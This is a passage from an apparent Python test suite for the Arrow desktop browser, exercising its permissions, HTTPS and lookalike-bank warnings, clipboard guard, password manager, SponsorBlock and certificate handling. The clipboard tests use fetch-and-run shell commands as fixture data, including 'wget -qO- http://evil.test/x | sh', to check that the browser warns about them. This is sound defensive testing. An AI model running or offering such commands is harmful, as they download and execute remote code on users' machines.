    def test_videos_keep_the_pages_own_preload(self):
        # Forcing preload='auto' made pages download videos nobody played (~6 MB more per tab).
        wv = self.load("/blank")
        js(wv, "window.v = document.createElement('video'); v.preload = 'none'; document.body.appendChild(v); 1")
        spin(lambda: False, 0.3)
        self.assertEqual(js(wv, "v.preload"), "none")

    def test_logout_still_clears_history_and_cookies(self):
        # Logging out or shutting down ends the browser with SIGTERM; it must close the normal way.
        home = tempfile.mkdtemp(dir=_HOME)
        config = os.path.join(home, ".config", "arrow-browser")
        os.makedirs(config)
        with open(os.path.join(config, "settings.json"), "w") as f:
            json.dump({"homepage": self.base + "/done", "open_homepage_on_startup": True, "first_run_greeted": True,
                       "clear_history_on_exit": True, "tracker_lists_enabled": False}, f)
        history, marker = os.path.join(config, "history.json"), os.path.join(config, "clear-on-exit.pending")
        proc = subprocess.Popen(bb.launch_argv(os.path.join(ROOT, "arrow_browser.py")), env=dict(os.environ, HOME=home),
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.addCleanup(lambda: proc.poll() is None and proc.kill())
        self.assertTrue(spin(lambda: os.path.exists(history) and os.path.exists(marker), 25), "never browsed")
        proc.terminate()
        self.assertEqual(proc.wait(20), 0)
        with open(history) as f:
            self.assertEqual(json.load(f), [], "history cleared")
        self.assertFalse(os.path.exists(marker), "cookies and site data were cleared before it quit")

    def test_popup_sleeps_without_killing_the_opener_it_shares_a_renderer_with(self):
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        opener_tab = self.open_tab("/done", "done")
        opener = opener_tab._arrow_webview
        popup = self.win.on_create_webview(opener, None)
        popup_tab = self.win._tab_boxes()[-1]
        popup.load_uri(self.base + "/thin")
        self.assertTrue(spin(lambda: popup.get_title() == "thin", 10))
        self.win.notebook.set_current_page(self.win.notebook.page_num(opener_tab))
        Handler.hits.clear()
        self.assertTrue(self.win._suspend_tab(popup_tab))
        spin(lambda: False, 1.5)
        self.assertEqual(js(opener, "document.title"), "done", "the opener's renderer is still running")
        self.assertEqual(Handler.hits.get("/done", 0), 0, "and it was not reloaded")
        self.win.close_tab(popup_tab)
        self.assertEqual(opener._arrow_related, {opener})

    def test_tab_a_page_opened_keeps_its_prompts_after_the_opener_closes(self):
        # The tabs share one content manager; its message handlers used to be cut when the opener tab closed.
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        opener_tab = self.open_tab("/done", "done")
        opener = opener_tab._arrow_webview
        popup = self.win.on_create_webview(opener, None)
        popup.load_uri(self.base + "/blank")
        self.assertTrue(spin(lambda: popup.get_title() == "blank", 10))
        ucm = popup.get_user_content_manager()
        self.assertTrue(ucm == opener.get_user_content_manager(), "the tabs share a content manager")
        self.win.close_tab(opener_tab)
        for name in ("_arrow_pw_handler", "_arrow_failed_handler", "_arrow_links_handler"):
            self.assertTrue(ucm.handler_is_connected(getattr(ucm, name)), name)
        self.win.notebook.set_current_page(self.win.notebook.page_num(self.win._tab_boxes()[-1]))
        popup.run_javascript_in_world("window.webkit.messageHandlers.arrowPw.postMessage("
                                      "{type: 'submit', user: 'bob', pass: 'pw1', url: location.href})",
                                      "arrow-pw", None, None, None)
        self.assertTrue(spin(lambda: "Save the password for bob" in self.infobar_text(), 5), self.infobar_text())
        self.win._clear_infobar()

    def test_tab_on_screen_reloads_if_its_renderer_is_ended(self):
        wv = self.load("/done", wait_title="done")
        Handler.hits.clear()
        wv.terminate_web_process()  # as if it shared a process with a tab put to sleep
        self.assertTrue(spin(lambda: Handler.hits.get("/done", 0) > 0 and wv.get_title() == "done", 10))
        self.assertFalse(self.asleep(self.win.get_active_tab_box()))

    def test_identify_as_chrome_per_site(self):
        wv = self.load("/blank")
        self.assertNotIn("Chrome/", js(wv, "navigator.userAgent"), "default: the engine's own (Safari) user agent")
        bb.set_site_value(self.win.site_settings, "127.0.0.1", "chrome_ua", True)
        self.addCleanup(self.win.site_settings.clear)
        wv = self.load("/blank")
        self.assertIn(f"Chrome/{bb.CHROME_UA_MAJOR}", js(wv, "navigator.userAgent"))
        self.assertIn("identifies as Chrome", self.win._describe_site_entry(self.win.site_settings["127.0.0.1"]))
        # combined with JavaScript off: both apply
        bb.set_site_value(self.win.site_settings, "127.0.0.1", "javascript", False)
        wv = self.load("/js", wait_title="js-off")
        self.assertEqual(wv.get_title(), "js-off")
        self.assertIn("Chrome/", wv.get_settings().get_user_agent())
        self.win.site_settings.clear()
        wv = self.load("/js", wait_title="js-ran")
        self.assertNotIn("Chrome/", js(wv, "navigator.userAgent"), "switched back off")

    def test_zoom_is_remembered_per_site(self):
        wv = self.load("/blank")
        self.win.adjust_zoom(0.3)
        self.assertAlmostEqual(self.win.site_settings["127.0.0.1"]["zoom"], 1.3, places=2)
        wv.set_zoom_level(1.0)
        wv = self.load("/done")
        self.assertTrue(spin(lambda: abs(wv.get_zoom_level() - 1.3) < 0.01, 5), "saved zoom re-applied on load")
        self.win.adjust_zoom(reset=True)
        self.assertNotIn("zoom", self.win.site_settings.get("127.0.0.1", {}))

    # ---- permissions ----------------------------------------------------
    def test_remembered_permissions_skip_the_prompt(self):
        wv = self.load("/blank")
        calls = []

        class Req:
            def allow(self): calls.append("allow")
            def deny(self): calls.append("deny")

        original = self.win._describe_permission
        self.win._describe_permission = lambda r: ("media", "use your camera")
        try:
            bb.set_site_value(self.win.site_settings, "127.0.0.1", "permissions", "allow", sub="media")
            self.assertTrue(self.win.on_permission_request(wv, Req()))
            bb.set_site_value(self.win.site_settings, "127.0.0.1", "permissions", "deny", sub="media")
            self.win.on_permission_request(wv, Req())
        finally:
            self.win._describe_permission = original
            self.win.site_settings.clear()
        self.assertEqual(calls, ["allow", "deny"])

    def test_permissions_nobody_can_judge_are_refused_without_asking(self):
        wv = self.load("/blank")
        calls = []

        class Unknown:  # e.g. a WebXR session or a request type added in a later WebKit
            def allow(self): calls.append("allow")
            def deny(self): calls.append("deny")

        self.assertEqual(self.win._describe_permission(Unknown()), (None, None))
        self.assertTrue(self.win.on_permission_request(wv, Unknown()))  # a prompt here would block the test
        self.assertEqual(calls, ["deny"])

    # ---- update notice -------------------------------------------------
    def test_update_notice_only_appears_after_a_check(self):
        win = self.win
        win.update_dialog_box.hide()
        win.show_all()  # what starting the browser does: it used to reveal the notice, unchecked
        self.assertFalse(win.update_dialog_box.get_visible(), "claimed 'latest version' without checking")
        win.show_latest_version_notification()
        self.assertTrue(win.update_dialog_box.get_visible())
        self.assertTrue(win.update_dialog_label.get_visible())
        self.assertIn("latest version", win.update_dialog_label.get_text())
        self.assertFalse(win.btn_restart_update.get_visible())
        win.show_update_notification_dialog("99.0.0", installed=True)
        self.assertTrue(win.btn_restart_update.get_visible(), "restart button shown for a downloaded update")
        win.update_dialog_box.hide()

    # ---- sandbox, fullscreen ----------------------------------------------
    def test_web_pages_run_in_the_sandbox(self):
        self.assertTrue(bb.webkit_sandbox_usable(), "bubblewrap can't start a sandbox on this machine")
        self.assertTrue(self.win.context.get_sandbox_enabled())

    def test_fullscreen_names_the_site_and_how_to_leave(self):
        win = self.win
        wv = self.load("/blank")
        original = win._apply_hardware_acceleration_policy
        win._apply_hardware_acceleration_policy = lambda: None  # a GPU policy flip isn't what's tested here
        try:
            win.on_webview_enter_fullscreen(wv)
            self.assertTrue(win.fullscreen_notice.get_visible())
            self.assertIn("127.0.0.1", win.fullscreen_notice.get_text())
            self.assertIn("Esc", win.fullscreen_notice.get_text())
            win.on_webview_leave_fullscreen(wv)
            self.assertFalse(win.fullscreen_notice.get_visible())
            self.assertIsNone(win._fullscreen_notice_source)
        finally:
            win._apply_hardware_acceleration_policy = original
            if win._fullscreen:
                win.on_webview_leave_fullscreen(wv)

    # ---- https warning --------------------------------------------------
    def test_https_warning_and_one_time_token(self):
        wv = self.load("/blank")
        self.win._show_https_warning(wv, "https://plain-only.example/page", "connection refused")
        self.assertTrue(spin(lambda: "Secure connection unavailable" in (js(wv, "document.body.innerText") or ""), 8))
        href = js(wv, "document.querySelector('a.alt').href")
        self.assertTrue(href.startswith("arrow://allow-http?t="))

        class SchemeReq:
            def __init__(self, uri): self.uri, self.body = uri, None
            def get_uri(self): return self.uri
            def finish(self, stream, length, ctype): self.body = stream.read_bytes(length, None).get_data().decode()

        forged = SchemeReq("arrow://allow-http?t=guess")
        self.win._on_arrow_scheme(forged, None)
        self.assertNotIn("plain-only.example", self.win._http_allowed_hosts, "a guessed token does nothing")
        real = SchemeReq(href)
        self.win._on_arrow_scheme(real, None)
        self.assertIn("plain-only.example", self.win._http_allowed_hosts)
        self.assertIn("http://plain-only.example/page", real.body)
        again = SchemeReq(href)
        self.win._on_arrow_scheme(again, None)
        self.assertNotIn("refresh", again.body, "the token is single-use")
        self.win._http_allowed_hosts.discard("plain-only.example")

    # ---- scam warnings ----------------------------------------------------
    class SchemeReq:
        def __init__(self, uri): self.uri, self.body = uri, None
        def get_uri(self): return self.uri
        def finish(self, stream, length, ctype): self.body = stream.read_bytes(length, None).get_data().decode()

    def test_lookalike_bank_address_is_stopped_before_it_loads(self):
        win = self.win
        wv = self.load("/blank")
        fake = "https://hdfc-netbanking.invalid/login"
        wv.load_uri(fake)
        self.assertTrue(spin(lambda: "This may be a fake site" in (js(wv, "document.body.innerText") or ""), 8))
        text = js(wv, "document.body.innerText")
        self.assertIn("HDFC Bank", text)
        self.assertEqual(wv.get_uri(), fake, "the address bar keeps showing the fake address")
        self.assertEqual(js(wv, "document.querySelector('a.btn').href"), "https://hdfcbank.com/")
        href = js(wv, "document.querySelector('a.alt').href")
        self.assertTrue(href.startswith("arrow://allow-site?t="), href)

        forged = self.SchemeReq("arrow://allow-site?t=guess")
        win._on_arrow_scheme(forged, None)
        self.assertNotIn("hdfc-netbanking.invalid", win.site_settings, "a guessed token does nothing")
        real = self.SchemeReq(href)
        win._on_arrow_scheme(real, None)
        self.assertIn(fake, real.body)
        self.assertTrue(win.site_settings["hdfc-netbanking.invalid"]["lookalike_ok"])
        self.assertFalse(win._stop_lookalike(wv, fake), "once the user chose to go on, it opens")
        again = self.SchemeReq(href)
        win._on_arrow_scheme(again, None)
        self.assertNotIn("refresh", again.body, "the token is single-use")

    def test_lookalike_address_after_a_redirect_is_stopped_too(self):
        win = self.win
        wv = self.load("/blank")
        wv.load_uri(self.base + "/to-fake-bank")
        self.assertTrue(spin(lambda: "This may be a fake site" in (js(wv, "document.body.innerText") or ""), 8))
        self.assertIn("State Bank of India", js(wv, "document.body.innerText"))
        win.lookalike_warning_enabled = False
        self.addCleanup(setattr, win, "lookalike_warning_enabled", True)
        self.assertFalse(win._stop_lookalike(wv, "http://sbi-kyc-update.invalid/login"), "the switch turns it off")
        self.load("/thin", "thin")  # ordinary sites aren't touched

    def copy_warnings(self, response):
        """Answers every copied-command warning that comes up with `response`; returns their texts."""
        seen = []

        def answer():
            for w in Gtk.Window.list_toplevels():
                if isinstance(w, Gtk.MessageDialog) and w.get_visible() and "copied" in (w.props.text or ""):
                    seen.append((w.props.text, w.props.secondary_text))
                    w.response(response)
            return True

        source = GLib.timeout_add(100, answer)
        self.addCleanup(GLib.source_remove, source)
        return seen

    def clipboard_page(self, path, title):
        win = self.win
        wv = self.load(path, title)
        win.is_active = lambda: True  # the test window may not have the desktop's focus
        self.addCleanup(lambda: delattr(win, "is_active"))
        win._clipboard_warned_text = None
        clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
        clipboard.set_text("nothing yet", -1)
        spin(lambda: False, 0.3)
        wv.grab_focus()
        return wv, clipboard

    def test_clipboard_guard_warns_about_a_fake_robot_check_and_removes_the_command(self):
        wv, clipboard = self.clipboard_page("/clickfix", "clickfix")
        seen = self.copy_warnings(Gtk.ResponseType.ACCEPT)
        self.mouse_click(wv, "b", 1)
        self.assertTrue(spin(lambda: seen, 5), "no warning for a command a page copied")
        self.assertIn("hidden command", seen[0][0])
        self.assertIn("127.0.0.1", seen[0][1])
        self.assertTrue(spin(lambda: clipboard.wait_for_text() in ("", None), 3), clipboard.wait_for_text())

    def test_clipboard_guard_leaves_the_users_own_copy_alone_but_not_a_swapped_one(self):
        win = self.win
        wv, clipboard = self.clipboard_page("/install-guide", "install-guide")
        seen = self.copy_warnings(Gtk.ResponseType.REJECT)
        js(wv, "getSelection().selectAllChildren(document.getElementById('cmd')); 1")
        win._user_copy(wv, WebKit2.EDITING_COMMAND_COPY)  # what the right-click Copy runs
        self.assertTrue(spin(lambda: clipboard.wait_for_text() == "curl -fsSL https://get.example.test | sh", 3))
        spin(lambda: seen, 1.5)
        self.assertEqual(seen, [], "the user copied what they selected")

        js(wv, "window.jack = true; 1")
        win._user_copy(wv, WebKit2.EDITING_COMMAND_COPY)
        self.assertTrue(spin(lambda: seen, 5), "no warning when the page swapped what was copied")
        self.assertEqual(seen[0][0], "This page copied a command")
        self.assertEqual(clipboard.wait_for_text(), "wget -qO- http://evil.test/x | sh", "Keep it copied keeps it")

        seen.clear()
        win._clipboard_warned_text = None
        set_trust = lambda: bb.set_site_value(win.site_settings, "127.0.0.1", "clipboard_ok", True)
        set_trust()
        clipboard.set_text("nothing yet", -1)
        spin(lambda: False, 0.3)
        wv.grab_focus()
        win._user_copy(wv, WebKit2.EDITING_COMMAND_COPY)
        self.assertTrue(spin(lambda: clipboard.wait_for_text() == "wget -qO- http://evil.test/x | sh", 3))
        spin(lambda: seen, 1.5)
        self.assertEqual(seen, [], "a site the user trusts isn't warned about")

    # ---- SponsorBlock ------------------------------------------------------
    def sponsorblock_setup(self):
        """Makes the local /watch page count as YouTube and SponsorBlock ask the local stand-in."""
        win = self.win
        if not Handler.video:
            Handler.video = make_test_video()
        if not Handler.video:
            self.skipTest("GStreamer can't make a test video here")
        local, youtube = f"http://127.0.0.1:{self.port}/", "https://www.youtube.com/"
        real_id, real_api, real_hosts = bb.youtube_video_id, bb.SPONSORBLOCK_API, bb.SPONSORBLOCK_HOSTS
        bb.youtube_video_id = lambda uri: real_id((uri or "").replace(local, youtube))
        bb.SPONSORBLOCK_API = self.base + "/sb-api/"
        bb.SPONSORBLOCK_HOSTS = real_hosts + ("127.0.0.1",)
        real_script = win.sponsorblock_script
        win.sponsorblock_script = WebKit2.UserScript.new_for_world(  # without the YouTube-only address list
            bb.SPONSORBLOCK_JS, WebKit2.UserContentInjectedFrames.TOP_FRAME,
            WebKit2.UserScriptInjectionTime.START, bb.SPONSORBLOCK_WORLD, None, None)

        def restore():
            win.on_sponsorblock_toggled(False)
            win.sponsorblock_script = real_script
            bb.youtube_video_id, bb.SPONSORBLOCK_API, bb.SPONSORBLOCK_HOSTS = real_id, real_api, real_hosts
            win._sponsor_segments.clear()
        self.addCleanup(restore)

    def load_watch_page(self):
        wv = self.win.get_active_webview()
        wv.load_uri(self.base + "/watch?v=dQw4w9WgXcQ")
        self.assertTrue(spin(lambda: wv.get_title() == "watch" and not wv.is_loading(), 10), "watch page didn't load")
        return wv

    def status_text(self):
        def labels(widget):
            if isinstance(widget, Gtk.Label):
                return [widget.get_text()]
            return sum((labels(c) for c in widget.get_children()), []) if isinstance(widget, Gtk.Container) else []
        return " ".join(labels(self.win.statusbar))

    def test_sponsorblock_skips_a_sponsor_and_sends_only_a_hash_prefix(self):
        win = self.win
        self.sponsorblock_setup()
        win.on_sponsorblock_toggled(True)
        self.assertTrue(win.sponsorblock_enabled)
        wv = self.load_watch_page()
        started = time.time()
        self.assertTrue(spin(lambda: float(js(wv, "document.getElementById('v').currentTime") or 0) >= 14, 12),
                        "the video never got past the sponsor")
        self.assertLess(time.time() - started, 10, "it played through the 12-second sponsor instead of skipping it")
        self.assertIn("Skipped a sponsor (0:02–0:14)", self.status_text())
        asked = [r for r in Handler.requests if r.startswith("/sb-api/")]
        self.assertEqual(len(asked), 1, asked)
        self.assertTrue(asked[0].startswith("/sb-api/5f6b?categories="), asked[0])
        self.assertNotIn("dQw4w9WgXcQ", asked[0])
        self.assertEqual(win._sponsor_segments["dQw4w9WgXcQ"], [[2.0, 14.0, "sponsor"]])
        self.assertEqual(win._sponsor_segments["zzzzzzzzzzz"], [], "the rest of the answer is kept for later")

    def test_sponsorblock_off_asks_nothing_and_turning_it_on_works_at_once(self):
        win = self.win
        self.sponsorblock_setup()
        win.on_sponsorblock_toggled(False)
        wv = self.load_watch_page()
        self.assertTrue(spin(lambda: float(js(wv, "document.getElementById('v').currentTime") or 0) >= 3, 8))
        self.assertEqual([r for r in Handler.requests if r.startswith("/sb-api/")], [])
        self.assertEqual(js(wv, "String(document.getElementById('v').currentTime < 10)"), "true", "nothing skipped")
        win.on_sponsorblock_toggled(True)  # switched on while the video plays: it skips without a reload
        self.assertTrue(spin(lambda: float(js(wv, "document.getElementById('v').currentTime") or 0) >= 14, 4),
                        "turning it on didn't reach the page that was already open")

    # ---- passwords ------------------------------------------------------
    def test_password_save_then_fill(self):
        wv = self.load("/login")
        js(wv, "document.getElementById('u').value='alice';document.getElementById('p').value='hunter2';"
               "document.getElementById('go').click();'x'")
        self.assertTrue(spin(lambda: self.win._infobar is not None, 6), "save prompt appears after submit")
        self.win._infobar.response(1)  # "Save"
        self.assertEqual(self.win.secrets.items, {("127.0.0.1", "alice"): "hunter2"})

        wv = self.load("/login")
        self.assertTrue(spin(lambda: self.win._infobar is not None, 6), "fill offer appears on a login page")
        self.win._infobar.response(1)  # "Fill"
        self.assertTrue(spin(lambda: js(wv, "document.getElementById('p').value") == "hunter2", 5))
        self.assertEqual(js(wv, "document.getElementById('u').value"), "alice")
        self.win.secrets.items.clear()

    def test_fill_offer_never_fills_another_site(self):
        win = self.win
        win.secrets.items[("127.0.0.1", "alice")] = "hunter2"
        self.addCleanup(win.secrets.items.clear)
        wv = self.load("/login")
        self.assertTrue(spin(lambda: win._infobar is not None, 6), "fill offer appears on a login page")
        bar = win._infobar
        other = f"http://localhost:{self.port}/login"  # another site, same login form
        wv.load_uri(other)
        self.assertTrue(spin(lambda: not wv.is_loading() and wv.get_uri() == other, 10))
        self.assertIsNone(win._infobar, "the fill offer closes when the tab goes to another page")
        bar.response(1)  # "Fill" clicked anyway (e.g. the click landed just as the page changed)
        spin(lambda: False, 0.5)
        self.assertEqual(js(wv, "document.getElementById('p').value"), "", "password went to another site")

    def test_password_prompts_belong_to_the_tab_that_sent_them(self):
        # The visible tab is on another site ("localhost") than the background login page ("127.0.0.1").
        win = self.win
        win.secrets.items[("127.0.0.1", "alice")] = "hunter2"
        before = win.notebook.get_n_pages()
        try:
            win.create_new_tab(self.base + "/login")
            login_tab = win.notebook.get_nth_page(win.notebook.get_n_pages() - 1)
            login = login_tab._arrow_webview
            win.create_new_tab(f"http://localhost:{self.port}/blank")
            front = win.get_active_webview()
            self.assertTrue(spin(lambda: not login.is_loading() and not front.is_loading()
                                 and front.get_title() == "blank", 10))
            spin(lambda: False, 1.0)  # the form message comes 300 ms after load
            self.assertIsNone(win._infobar, "no fill offer over another site's tab")

            win.notebook.set_current_page(win.notebook.page_num(login_tab))
            self.assertTrue(spin(lambda: win._infobar is not None, 3), "offered once the login tab is shown")
            win._infobar.response(1)  # "Fill"
            self.assertTrue(spin(lambda: js(login, "document.getElementById('p').value") == "hunter2", 5))

            win.secrets.items.clear()
            win._fill_offered.clear()
            win.notebook.set_current_page(win.notebook.get_n_pages() - 1)  # back to localhost
            js(login, "document.getElementById('u').value='carol';document.getElementById('p').value='s3cret';"
                      "document.getElementById('go').click();'x'")
            self.assertTrue(spin(lambda: win._infobar is not None, 6), "save prompt for a background submit")
            win._infobar.response(1)  # "Save"
            self.assertEqual(win.secrets.items, {("127.0.0.1", "carol"): "s3cret"}, "saved for the tab's own site")
        finally:
            win.secrets.items.clear()
            win._clear_infobar()
            for i in reversed(range(before, win.notebook.get_n_pages())):
                win.close_tab(win.notebook.get_nth_page(i))

    def test_password_message_counts_for_the_page_that_sent_it(self):
        # A page can submit a login form and move the tab to another site at once; the message then arrives
        # while the tab shows that other site, which must not get the login (or a fill offer).
        win = self.win
        self.addCleanup(win._clear_infobar)
        self.addCleanup(win.secrets.items.clear)
        wv = self.load("/blank")
        other = f"http://localhost:{self.port}/blank"
        wv.load_uri(other)
        self.assertTrue(spin(lambda: not wv.is_loading() and wv.get_uri() == other, 10))
        for message in ({"type": "form"}, {"type": "submit", "user": "eve", "pass": "pw1"}):
            message["url"] = self.base + "/blank"  # sent by the 127.0.0.1 page, before the tab moved on
            win.secrets.items[("localhost", "me")] = "mine"
            wv.run_javascript_in_world("window.webkit.messageHandlers.arrowPw.postMessage(%s)" % json.dumps(message),
                                       "arrow-pw", None, None, None)
            spin(lambda: win._infobar is not None, 1.5)
            if message["type"] == "form":
                self.assertIsNone(win._infobar, "no fill offer for the site the tab moved on to")
        self.assertIn("127.0.0.1", self.infobar_text(), "the save prompt names the page that sent the login")
        win._infobar.response(1)  # "Save"
        self.assertEqual(win.secrets.items, {("localhost", "me"): "mine", ("127.0.0.1", "eve"): "pw1"})

    def test_password_prompt_respects_never_and_private(self):
        self.win.site_settings["127.0.0.1"] = {"passwords": False}
        wv = self.load("/login")
        js(wv, "document.getElementById('u').value='bob';document.getElementById('p').value='pw';document.getElementById('go').click();'x'")
        spin(lambda: False, 1.5)
        self.assertIsNone(self.win._infobar, "'never for this site' suppresses the prompt")

    # ---- stats / report / import ---------------------------------------
    def test_privacy_report_and_stats(self):
        before = self.win.stats["params"]
        self.win._count_event("params")
        self.assertEqual(self.win.stats["params"], before + 1)
        html = self.win.build_privacy_report_html()
        self.assertIn("Privacy Report", html)
        self.assertIn("Tracking parameters removed", html)
        self.assertNotIn("Trackers &amp; ads blocked", html, "native blocks are not reported to us, so no fake zero")
        self.win._run_session_save()
        self.assertGreaterEqual(bb.load_privacy_stats()["params"], before + 1, "stats are persisted")

    def test_import_merges_into_live_lists(self):
        marks = [{"url": "https://imp.example/", "title": "Imp", "added": 1}]
        hist = [{"url": "https://imp.example/h", "title": "H", "visits": 2, "total_seconds": 0.0, "last_visited": 5}]
        added_b, added_h = self.win._apply_import(marks, hist)
        self.assertEqual((added_b, added_h), (1, 1))
        self.assertEqual(self.win._apply_import(marks, hist), (0, 0), "importing twice adds nothing")
        with open(bb.BOOKMARKS_FILE) as f:
            self.assertIn("https://imp.example/", [b["url"] for b in json.load(f)])
        self.assertIn("https://imp.example/h", [row[0] for row in self.win.url_completion_store])

    def test_clear_on_exit_removes_cookies(self):
        wv = self.load("/blank", "blank")
        uri = self.base + "/blank"
        wv.run_javascript("document.cookie = 'sid=signed-in; max-age=3600'", None, None, None)
        cookie_mgr = self.win.context.get_cookie_manager()

        def cookie_names():
            out = []
            cookie_mgr.get_cookies(uri, None, lambda m, r, _d: out.append(
                [c.get_name() for c in m.get_cookies_finish(r)]), None)
            spin(lambda: out, 5)
            return out[0] if out else None

        self.assertTrue(spin(lambda: "sid" in (cookie_names() or []), 5), "test cookie was never set")
        bb.mark_clear_on_exit_pending()
        done = []
        self.win._clear_website_data(lambda: done.append(True))
        self.assertTrue(spin(lambda: done, 10), "clear never finished")
        self.assertEqual(cookie_names(), [], "cookies survive the exit clear")
        self.assertFalse(os.path.exists(bb.CLEAR_ON_EXIT_MARKER), "marker kept after a successful clear")
        spin(lambda: False, 0.3)
        self.assertEqual(done, [True], "on_done ran more than once")

    def test_settings_search_shows_matching_rows_on_any_page(self):
        dialog = self.win.build_settings_dialog("general")
        self.addCleanup(dialog.destroy)
        dialog.show_all()
        stack, search, c = dialog._arrow_stack, dialog._arrow_search, dialog._arrow_controls

        def row_of(key):
            return c[key].get_parent()

        def shown(widget):
            while widget is not None and widget is not stack:
                if not widget.get_visible():
                    return False
                widget = widget.get_parent()
            return True

        self.assertFalse(search.has_focus(), "Settings opens on its pages, not in the search box")
        search.set_text("cookie banner")
        spin(lambda: stack.get_visible_child_name() == "privacy", 2)
        self.assertEqual(stack.get_visible_child_name(), "privacy", "jumps to the page that has a match")
        self.assertTrue(shown(row_of("hide_cookie_banners")))
        self.assertFalse(shown(row_of("adblock_enabled")), "rows that don't match are hidden")
        self.assertFalse(shown(row_of("dark_mode_active")))

        search.set_text("")
        spin(lambda: shown(row_of("adblock_enabled")), 2)
        for key in ("hide_cookie_banners", "adblock_enabled", "dark_mode_active"):
            self.assertTrue(shown(row_of(key)) or stack.get_visible_child_name() != "privacy", key)
        stack.set_visible_child_name("general")
        self.assertTrue(shown(row_of("dark_mode_active")), "clearing the search brings every row back")

    def test_settings_dialog_pages_and_switches(self):
        dialog = self.win.build_settings_dialog("privacy")
        try:
            stack = dialog._arrow_stack
            self.assertEqual([stack.child_get_property(c, "name") for c in stack.get_children()],
                             ["general", "privacy", "data", "performance", "wellbeing", "about"])
            self.assertEqual(stack.get_visible_child_name(), "privacy")
            controls = dialog._arrow_controls
            for key, sw in controls.items():
                if isinstance(sw, Gtk.Switch):
                    self.assertEqual(sw.get_active(), bool(getattr(self.win, key)), key)

            sw = controls["clear_history_on_exit"]
            sw.set_active(not sw.get_active())
            self.assertEqual(self.win.clear_history_on_exit, sw.get_active())
            with open(bb.CONFIG_FILE) as f:
                self.assertEqual(json.load(f)["clear_history_on_exit"], sw.get_active(), "saved to disk")
            self.assertEqual(os.path.exists(bb.CLEAR_ON_EXIT_MARKER), sw.get_active(), "crash marker follows the switch")
            sw.set_active(not sw.get_active())
            self.assertEqual(os.path.exists(bb.CLEAR_ON_EXIT_MARKER), sw.get_active())

            dark = controls["dark_mode_active"]
            dark.set_active(not dark.get_active())
            self.assertEqual(self.win.dark_mode_active, dark.get_active())
            dark.set_active(not dark.get_active())
            self.assertEqual(self.win.dark_mode_active, dark.get_active())
        finally:
            dialog.destroy()

    def test_lock_colour_follows_the_connection(self):
        win, style = self.win, self.win.url_entry.get_style_context()
        cert = Gio.TlsCertificate.new_from_file(self.cert_file)

        class Page:
            def __init__(self, tls, mixed=False, committed=True):
                self.tls, self._arrow_mixed_content, self._arrow_committed = tls, mixed, committed

            def get_tls_info(self):
                return self.tls

        verified, bad = (True, cert, Gio.TlsCertificateFlags(0)), (True, cert, Gio.TlsCertificateFlags.UNKNOWN_CA)
        for uri, page, expected in (
                ("https://x.example/", Page(verified), "url-secure"),
                ("https://x.example/", Page(verified, mixed=True), "url-mixed"),
                ("https://x.example/", Page(bad), "url-insecure"),
                ("https://x.example/", Page(verified, committed=False), None),  # still connecting
                ("https://x.example/", None, None),  # the address alone proves nothing
                ("http://x.example/", Page((False, None, 0)), "url-insecure"),
                ("about:blank", Page((False, None, 0)), None)):
            win.update_security_icon(uri, page)
            shown = [c for c in ("url-secure", "url-mixed", "url-insecure") if style.has_class(c)]
            self.assertEqual(shown, [expected] if expected else [], (uri, page and page.__dict__))

    def test_invalid_certificate_is_blocked_without_a_bypass(self):
        # In its own tab: a tab left showing a browser-made page freezes when later tests switch GPU modes
        # (a WebKitGTK problem with any load_html() page, not specific to this one).
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        url = f"https://127.0.0.1:{self.tls_servers['127.0.0.1'].server_port}/done"
        self.win.create_new_tab(url)
        tab = self.win._tab_boxes()[-1]
        self.win.notebook.set_current_page(self.win.notebook.page_num(tab))
        wv = tab._arrow_webview
        self.assertTrue(spin(lambda: "not private" in (js(wv, "document.body ? document.body.innerText : ''") or ""), 10))
        self.assertNotIn("/done", Handler.requests, "the request never reached the site")
        self.assertEqual(wv.get_uri(), url)
        self.assertIn("bypass", js(wv, "document.body.innerText"))
        self.assertFalse(self.win.url_entry.get_style_context().has_class("url-secure"))

    def test_lock_reads_the_real_connection(self):
        # Trusting the test certificate for 127.0.0.2 only (127.0.0.1 stays blocked for the test above):
        # WebKit then loads the page but still reports the certificate's errors, and the lock must show them.
        self.win.context.allow_tls_certificate_for_host(Gio.TlsCertificate.new_from_file(self.cert_file), "127.0.0.2")
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        self.win.create_new_tab(f"https://127.0.0.2:{self.tls_servers['127.0.0.2'].server_port}/done")
        tab = self.win._tab_boxes()[-1]
        self.win.notebook.set_current_page(self.win.notebook.page_num(tab))
        wv = tab._arrow_webview
        self.assertTrue(spin(lambda: not wv.is_loading() and wv.get_title() == "done", 10), wv.get_uri())
        state, cert = self.win.connection_security(wv, wv.get_uri())
        self.assertEqual(state, "bad-cert")
        self.assertEqual(bb.certificate_summary(cert)["issued_to"], "arrow-test.example")
        self.assertTrue(self.win.url_entry.get_style_context().has_class("url-insecure"))
        self.assertIn("certificate has problems", self.win.url_entry.get_icon_tooltip_text(Gtk.EntryIconPosition.PRIMARY))
        markup = self.win.site_security_markup(wv, wv.get_uri(), "127.0.0.2")
        self.assertIn("Issued by: Arrow Test Issuer", markup)

    def test_certificate_details(self):
        c = bb.certificate_summary(Gio.TlsCertificate.new_from_file(self.cert_file))
        der = ssl.PEM_cert_to_DER_cert(open(self.cert_file).read())
        import hashlib
        self.assertEqual(c["sha256"].replace(":", ""), hashlib.sha256(der).hexdigest().upper())
        self.assertEqual((c["issued_to"], c["issued_by"]), ("arrow-test.example", "Arrow Test Issuer"))
        self.assertRegex(c["valid_until"], r"^\d{1,2} [A-Z][a-z]{2} \d{4}$")
        self.assertEqual(bb.dn_field(r"C=US,O=Acme\, Inc.,CN=R3", "O"), "Acme, Inc.")

    def test_about_page_links_to_the_project_page(self):
        dialog = self.win.build_settings_dialog("about")
        try:
            def find(widget):
                if isinstance(widget, Gtk.Label) and widget.get_text() == "Project page on GitHub":
                    return widget
                for child in (widget.get_children() if isinstance(widget, Gtk.Container) else ()):
                    found = find(child)
                    if found:
                        return found
            row = find(dialog).get_parent()
            while not hasattr(row, "_arrow_button"):
                row = row.get_parent()
            pages = self.win.notebook.get_n_pages()
            opened = []
            self.win.create_new_tab = lambda url=None, **kw: opened.append(url)
            try:
                row._arrow_button.clicked()
                spin(lambda: opened, 2)
            finally:
                del self.win.create_new_tab
